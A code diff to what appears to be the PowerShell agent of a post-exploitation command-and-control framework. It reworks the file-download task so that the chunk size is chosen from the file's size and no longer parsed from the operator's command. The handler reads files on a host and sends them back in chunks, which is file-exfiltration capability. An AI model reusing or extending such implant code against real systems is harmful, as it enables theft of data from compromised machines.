@@ -933,44 +933,31 @@ function Get-FilePart {
             elseif($type -eq 41) {
                 
                 try {
-                    $ChunkSize = 128KB
 
-                    $Parts = $Data.Split(" ")
-
-                    if($Parts.Length -gt 1) {
-                        $Path = $Parts[0..($parts.length-2)] -join " "
-                        try {
-                            $ChunkSize = $Parts[-1]/1
-                            if($Parts[-1] -notlike "*b*") {
-                                # if MB/KB not specified, assume KB and adjust accordingly
-                                $ChunkSize = $ChunkSize * 1024
-                            }
-                        }
-                        catch {
-                            # if there's an error converting the last token, assume no
-                            #   chunk size is specified and add the last token onto the path
-                            $Path += " $($Parts[-1])"
-                        }
-                    }
-                    else {
-                        $Path = $Data
-                    }
+                    $Path = $Data
 
                     $Path = $Path.Trim('"').Trim("'")
 
-                    # hardcoded floor/ceiling limits
-                    if($ChunkSize -lt 64KB) {
-                        $ChunkSize = 64KB
-                    }
-                    elseif($ChunkSize -gt 4MB) {
-                        $ChunkSize = 4MB
-                    }
-
-                    # resolve the complete path
+                    # Resolve the full path
                     $Path = Get-Childitem $Path | ForEach-Object {$_.FullName}
 
+                    # Get the file size to determine the ChunkSize
+                    $fileSize = (Get-Item $Path).Length
+
+                    # hardcoded floor/ceiling limits
+                    if($fileSize -lt 64KB) {
+                        $ChunkSize = 64KB
+                    }
+                    elseif($fileSize -gt 4MB) {
+                        $ChunkSize = 4MB
+                    }
+                    else {
+                        $ChunkSize = 128KB
+                    }
+                   
                     # read in and send the specified chunk size back for as long as the file has more parts
                     $jobID = Start-DownloadJob -ScriptString $Download -type $type -Path $Path -ResultID $ResultID -ChunkSize $ChunkSize
+                    
                     
                 }
                 catch {
@@ -1270,8 +1257,6 @@ function Get-FilePart {
             }
             else {
                 $Results = Receive-DownloadJob -JobName $JobName
-                
-                
             }
 
             if($Results) {
